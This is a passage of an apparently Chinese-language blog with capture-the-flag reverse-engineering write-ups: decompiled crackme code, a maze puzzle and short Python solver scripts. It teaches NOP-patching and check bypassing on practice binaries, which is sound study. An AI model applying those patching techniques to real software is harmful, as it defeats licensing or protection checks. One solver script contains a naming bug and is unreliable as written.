&apos;-d&apos;:</span><br><span class="line">            decoded = authcode(b, &apos;DECODE&apos;, expiry=ex)</span><br><span class="line">            print decoded</span><br><span class="line"># okay decompyling reverse300.pyc </span><br><span class="line"># decompiled 1 files: 1 okay, 0 failed, 0 verify failed</span><br><span class="line"># 2018.10.23 17:05:34 CST</span><br></pre></td></tr></table></figure><p>要求是输入至少3个参数，第一个输入-d的话就是解密，第二个参数就输入题目给的字符串就行了，不知道第三个参数该输入啥，直接把<code>if len(sys.argv) &lt; 3:        exit(1)</code>给nop掉了。</p><p>运行发现程序没有结果，可能是解密函数出了一些问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if operation == &apos;DECODE&apos;:</span><br><span class="line">    if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0:</span><br><span class="line">        if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]:</span><br><span class="line">            return result[26:]</span><br><span class="line">        else:</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">    else:</span><br><span class="line">        return &apos;&apos;</span><br><span class="line">else:</span><br><span class="line">    return keyc + base64.b64encode(result)</span><br></pre></td></tr></table></figure><p>最里面的return result[26:]可能就是正确结果，把所有return替换成这个之后运行得到flag。</p><h1 id="Keylead（ASIS-CTF-2015）"><a href="#Keylead（ASIS-CTF-2015）" class="headerlink" title="Keylead（ASIS CTF 2015）"></a>Keylead（ASIS CTF 2015）</h1><p>下载下来是个7z文件，后缀改为7z解压后用ida打开，从主函数发现是一个掷🎲小游戏，和上一篇里的🎲要求掷的数字也是一样的，不过这个要用gdb调试，无奈gdb鶸，只能用ida看看输出flag的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line">  v11 = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  while ( v11 != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    putchar(byte_601680[14 * v11++]);</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      while ( v7 &lt;= 1 )</span><br><span class="line">        putchar(byte_601680[20 * v11 - 8 * v7++]);</span><br><span class="line">      v1 = v7 + 1;</span><br><span class="line">      v2 = 3 * v11;</span><br><span class="line">      putchar(byte_601680[2 * v2 + 11 + v1]);</span><br><span class="line">      v2 *= 5;</span><br><span class="line">      v8 = v1 - 1;</span><br><span class="line">      putchar(byte_601680[2 * v2 + v8]);</span><br><span class="line">      v12 = v2 / 3;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">          if ( !v8 )</span><br><span class="line">          &#123;</span><br><span class="line">            putchar(byte_601680[2 * v12]);</span><br><span class="line">            v15 = v12 ^ 2;</span><br><span class="line">            while ( 2 )</span><br><span class="line">            &#123;</span><br><span class="line">              for ( i = 1; i &lt;= 9; ++i )</span><br><span class="line">                putchar(byte_601680[10 * (i % 2) + 3 + v15]);</span><br><span class="line">              v13 = v15 + 1;</span><br><span class="line">LABEL_44:</span><br><span class="line">              putchar(byte_601680[v13 / 3]);</span><br><span class="line">              if ( i == 10 )</span><br><span class="line">              &#123;</span><br><span class="line">                v13 += 2 * v13 + 13;</span><br><span class="line">                i = 19;</span><br><span class="line">                goto LABEL_33;</span><br><span class="line">              &#125;</span><br><span class="line">              if ( i == 2 )</span><br><span class="line">              &#123;</span><br><span class="line">                i = v13-- + 2;</span><br><span class="line">                goto LABEL_4;</span><br><span class="line">              &#125;</span><br><span class="line">              if ( (unsigned int)(i - 22) &lt;= 0xA )</span><br><span class="line">              &#123;</span><br><span class="line">                v14 = v13 - 3;</span><br><span class="line">                for ( j = i - v14; ; j = 8 )</span><br><span class="line">                &#123;</span><br><span class="line">LABEL_58:</span><br><span class="line">                  putchar(byte_601680[v14 + 1]);</span><br><span class="line">                  v16 = v14 + 1;</span><br><span class="line">                  if ( j == 11 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v13 = (v16 + 14) / 2;</span><br><span class="line">                    i = 11 * (v13 / 6);</span><br><span class="line">                    goto LABEL_44;</span><br><span class="line">                  &#125;</span><br><span class="line">                  if ( j != 13 )</span><br><span class="line">                    break;</span><br><span class="line">                  v12 = v16 + 8;</span><br><span class="line">                  v8 = 2;</span><br><span class="line">LABEL_51:</span><br><span class="line">                  while ( 2 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    putchar(byte_601680[v12 - 10]);</span><br><span class="line">                    if ( v8 == v12 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v4 = v8 + 2;</span><br><span class="line">                      v5 = v12 + 2;</span><br><span class="line">                      putchar(byte_601680[v5 / 2 + v4 / 5]);</span><br><span class="line">                      i = v4 / 2;</span><br><span class="line">                      putchar(byte_601680[i / 5 + v5]);</span><br><span class="line">                      v13 = v5 + i - 1 + v5;</span><br><span class="line">                      while ( 1 )</span><br><span class="line">                      &#123;</span><br><span class="line">LABEL_33:</span><br><span class="line">                        putchar(byte_601680[v13 - 19]);</span><br><span class="line">                        if ( i == 2 )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v3 = v13 + 1;</span><br><span class="line">                          putchar(byte_601680[v3 / 2 - 3]);</span><br><span class="line">                          v13 = v3 / 5 + 2;</span><br><span class="line">                          i = 2;</span><br><span class="line">                          goto LABEL_44;</span><br><span class="line">                        &#125;</span><br><span class="line">                        if ( i &lt;= 2 )</span><br><span class="line">                          break;</span><br><span class="line">                        if ( i == 10 )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v12 = v13 - 31;</span><br><span class="line">                          v8 = 9;</span><br><span class="line">                          goto LABEL_51;</span><br><span class="line">                        &#125;</span><br><span class="line">                        if ( i != 19 )</span><br><span class="line">                          goto LABEL_44;</span><br><span class="line">                        i = 2;</span><br><span class="line">                      &#125;</span><br><span class="line">                      if ( i == 1 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v8 = 17;</span><br><span class="line">                        v12 = v13 % 5 - 17 + v13;</span><br><span class="line">LABEL_20:</span><br><span class="line">                        putchar(byte_601680[v12 - v8 + 9]);</span><br><span class="line">                        v12 += ~v8++;</span><br><span class="line">                        continue;</span><br><span class="line">                      &#125;</span><br><span class="line">                      goto LABEL_44;</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                  &#125;</span><br><span class="line">                  if ( v8 != 9 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    if ( v8 != 2 )</span><br><span class="line">                      goto LABEL_12;</span><br><span class="line">                    j = 2;</span><br><span class="line">                    v16 = v12 - 18;</span><br><span class="line">LABEL_64:</span><br><span class="line">                    v6 = 9 * j;</span><br><span class="line">                    putchar(byte_601680[v16 / 2 + v6 + v6 % 10]);</span><br><span class="line">                    v11 = v16 + 1;</span><br><span class="line">                    v7 = v6 % 10;</span><br><span class="line">                    goto LABEL_21;</span><br><span class="line">                  &#125;</span><br><span class="line">                  putchar(byte_601680[v12 - 16]);</span><br><span class="line">                  v14 = v12 / 2;</span><br><span class="line">                &#125;</span><br><span class="line">                if ( j == 8 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v15 = v16 + 1;</span><br><span class="line">                  i = 7;</span><br><span class="line">                  continue;</span><br><span class="line">                &#125;</span><br><span class="line">                goto LABEL_64;</span><br><span class="line">              &#125;</span><br><span class="line">              goto LABEL_4;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v8 == 2 )</span><br><span class="line">            break;</span><br><span class="line">          if ( v12 == 7 )</span><br><span class="line">          &#123;</span><br><span class="line">            putchar(byte_601680[21 - v8]);</span><br><span class="line">            v13 = 49;</span><br><span class="line">            i = v8 / 3;</span><br><span class="line">            goto LABEL_33;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v8 != 3 )</span><br><span class="line">            goto LABEL_20;</span><br><span class="line">          putchar(byte_601680[2 * (v12 / 3)]);</span><br><span class="line">          v13 = v12 / 3;</span><br><span class="line">          i = 9;</span><br><span class="line">          do</span><br><span class="line">          &#123;</span><br><span class="line">            while ( 1 )</span><br><span class="line">            &#123;</span><br><span class="line">              if ( v13 == 10 )</span><br><span class="line">              &#123;</span><br><span class="line">                putchar(byte_601680[i + 8]);</span><br><span class="line">                v14 = 9;</span><br><span class="line">                j = i + 1;</span><br><span class="line">                goto LABEL_58;</span><br><span class="line">              &#125;</span><br><span class="line">              if ( v13 == 11 )</span><br><span class="line">              &#123;</span><br><span class="line">                putchar(byte_601680[i / 7]);</span><br><span class="line">                v13 = i-- - 11;</span><br><span class="line">              &#125;</span><br><span class="line">LABEL_4:</span><br><span class="line">              if ( i != 9 )</span><br><span class="line">                break;</span><br><span class="line">              putchar(byte_601680[v13 * v13 + 7]);</span><br><span class="line">              v13 = v13 * v13 + 1;</span><br><span class="line">              i = 10;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          while ( i != 13 );</span><br><span class="line">          putchar(byte_601680[2 * v13 + 12]);</span><br><span class="line">          v8 = 3;</span><br><span class="line">          v12 = 3 * v13;</span><br><span class="line">        &#125;</span><br><span class="line">        putchar(byte_601680[3 * v12 + 1]);</span><br><span class="line">        v0 = v12 * v12;</span><br><span class="line">        putchar(byte_601680[v0 - 15]);</span><br><span class="line">        v11 = v0 - 15;</span><br><span class="line">        v7 = 4;</span><br><span class="line">        putchar(byte_601680[4]);</span><br><span class="line">LABEL_21:</span><br><span class="line">        if ( v7 != 4 )</span><br><span class="line">          break;</span><br><span class="line">        putchar(byte_601680[v11 + 6]);</span><br><span class="line">        v12 = v11 - 3;</span><br><span class="line">        v8 = 3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v7 != 8 );</span><br><span class="line">    putchar(byte_601680[2 * v11 + 32]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>…有点烦，还是先学习下gdb吧。</p><p>学习后发现用ida远程调试就可以了，并不一定要用gdb，调试时把所有跳转到失败情况的jle之类的nop掉，这样运行到最后就会输出flag了。</p><h1 id="分道扬镳"><a href="#分道扬镳" class="headerlink" title="分道扬镳"></a>分道扬镳</h1><p>题目说是一个迷宫，ida打开，用字符串查看地图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">********</span><br><span class="line">* *    *</span><br><span class="line">* * ** *</span><br><span class="line">* * ** *</span><br><span class="line">* * #* *</span><br><span class="line">* **** *</span><br><span class="line">*      *</span><br><span class="line">********</span><br></pre></td></tr></table></figure><p>找到调用这个地图的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">  v5 = 0;</span><br><span class="line">  memset(&amp;v6, 0, 0x74u);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  strcpy(&amp;v2, &quot;********* *    ** * ** ** * ** ** * #* ** **** **      *********&quot;);</span><br><span class="line">  v1 = &amp;v3;</span><br><span class="line">  printf(&quot;Please input your key:\n&quot;);</span><br><span class="line">  gets(&amp;v5);</span><br><span class="line">  if ( strlen(&amp;v5) != 22 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = *(&amp;v5 + v11);</span><br><span class="line">    if ( v10 != &apos;k&apos; &amp;&amp; v10 != &apos;j&apos; &amp;&amp; v10 != &apos;h&apos; &amp;&amp; v10 != &apos;l&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">      system(&quot;pause&quot;);</span><br><span class="line">      exit(2);</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = *(&amp;v5 + v11);</span><br><span class="line">    switch ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      case &apos;h&apos;:</span><br><span class="line">        if ( --v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || (result = (char *)*v1, result == (char *)&apos;*&apos;) )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(3);</span><br><span class="line">        &#125;</span><br><span class="line">        if ( *v1 == &apos;#&apos; )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_41:</span><br><span class="line">          printf(&quot;Good!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;j&apos;:</span><br><span class="line">        v1 += 8;</span><br><span class="line">        if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(3);</span><br><span class="line">        &#125;</span><br><span class="line">        result = (char *)*v1;</span><br><span class="line">        if ( result == (char *)&apos;#&apos; )</span><br><span class="line">          goto LABEL_41;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;k&apos;:</span><br><span class="line">        v1 -= 8;</span><br><span class="line">        if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(3);</span><br><span class="line">        &#125;</span><br><span class="line">        result = v1;</span><br><span class="line">        if ( *v1 == &apos;#&apos; )</span><br><span class="line">          goto LABEL_41;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        if ( ++v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(4);</span><br><span class="line">        &#125;</span><br><span class="line">        result = v1;</span><br><span class="line">        if ( *v1 == &apos;#&apos; )</span><br><span class="line">          goto LABEL_41;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v11;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v11 &lt; 25 );</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>分析得j是向下，k是向上，h向左，l向右，不能走到*上，走到#就走出了迷宫，结合地图得到答案。</p><h1 id="10000000"><a href="#10000000" class="headerlink" title="10000000"></a>10000000</h1><p>ida打开，main函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__main();</span><br><span class="line">v17 = 0;</span><br><span class="line">memset(&amp;v18, 0, 0x10u);</span><br><span class="line">memset(&amp;v4, 0, 0x14u);</span><br><span class="line">v4 = -26;</span><br><span class="line">v5 = -20;</span><br><span class="line">v6 = -31;</span><br><span class="line">v7 = -25;</span><br><span class="line">v8 = -70;</span><br><span class="line">v9 = -12;</span><br><span class="line">v10 = -27;</span><br><span class="line">v11 = -13;</span><br><span class="line">v12 = -12;</span><br><span class="line">v13 = -12;</span><br><span class="line">v14 = -27;</span><br><span class="line">v15 = -13;</span><br><span class="line">v16 = -12;</span><br><span class="line">v19 = 0;</span><br><span class="line">puts(asc_403024);</span><br><span class="line">scanf(&quot;%s&quot;, &amp;v17);</span><br><span class="line">LOBYTE(v19) = 0;</span><br><span class="line">while ( *((_BYTE *)&amp;v17 + v19) )</span><br><span class="line">  *((_BYTE *)&amp;v17 + v19++) |= 0x80u;</span><br><span class="line">if ( !strcmp((const char *)&amp;v17, &amp;v4) )</span><br><span class="line">  printf(&quot;good&quot;);</span><br><span class="line">else</span><br><span class="line">  printf(&quot;wrong&quot;);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>逻辑很简单，输入|=0x80后与v4相等就ok了，不过不清楚|可不可以逆运算，来一发爆破吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">v4=[0xe6,0xec,0xe1,0xe7,0xba,0xf4,0xe5,0xf3,0xf4,0xf4,0xe5,0xf3,0xf4]</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(len(v4)):</span><br><span class="line">  for j in string.printable:</span><br><span class="line">    if ord(j)|0x80==v4[i]:</span><br><span class="line">      flag+=j</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>需要注意的是ida打开时v4的值默认显示的是十进制负数……如果用这个来爆破是不会得到结果的，转换成十六进制后变成正数（鶸也不知道为啥），随后就可以得到flag了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实验吧-1</title>
      <link href="/2018/10/22/%E5%AE%9E%E9%AA%8C%E5%90%A7-1/"/>
      <url>/2018/10/22/%E5%AE%9E%E9%AA%8C%E5%90%A7-1/</url>
      
        <content type="html"><![CDATA[<h1 id="证明自己吧"><a href="#证明自己吧" class="headerlink" title="证明自己吧"></a>证明自己吧</h1><p>ida打开，定位到关键函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">  v5 = dword_40708C;</span><br><span class="line">  v6 = dword_407090;</span><br><span class="line">  v8 = word_407098;</span><br><span class="line">  v9 = byte_40709A;</span><br><span class="line">  v7 = dword_407094;</span><br><span class="line">  if ( strlen(a1) == strlen((const char *)&amp;v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = 0;</span><br><span class="line">    if ( strlen(a1) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">        a1[v1++] ^= 0x20u;</span><br><span class="line">      while ( v1 &lt; strlen(a1) );</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = 0;</span><br><span class="line">    if ( strlen((const char *)&amp;v5) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">        *((_BYTE *)&amp;v5 + v2++) -= 5;</span><br><span class="line">      while ( v2 &lt; strlen((const char *)&amp;v5) );</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = 0;</span><br><span class="line">    if ( strlen((const char *)&amp;v5) == 0 )</span><br><span class="line">      return 1;</span><br><span class="line">    while ( *((_BYTE *)&amp;v5 + v3 + a1 - (const char *)&amp;v5) == *((_BYTE *)&amp;v5 + v3) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( ++v3 &gt;= strlen((const char *)&amp;v5) )</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知flag的长度和v5相等，flag每位与0x20异或，v5每位减5之后，flag[i]=v5[i]。</p><p>逆运算脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v5=[0x68,0x57,0x19,0x48,0x50,0x6e,0x58,0x78,0x54,0x6a,0x19,0x58,0x5e,6]</span><br><span class="line">temp=[]</span><br><span class="line">for i in v5:</span><br><span class="line">i-=5</span><br><span class="line">i^=0x20</span><br><span class="line">key.append(i)</span><br><span class="line">flag=&apos;&apos;.join([chr(i) for i in temp])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h1 id="NSCTF-Reverse-500"><a href="#NSCTF-Reverse-500" class="headerlink" title="NSCTF Reverse 500"></a>NSCTF Reverse 500</h1><p>pyc文件直接在线反编译一波：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 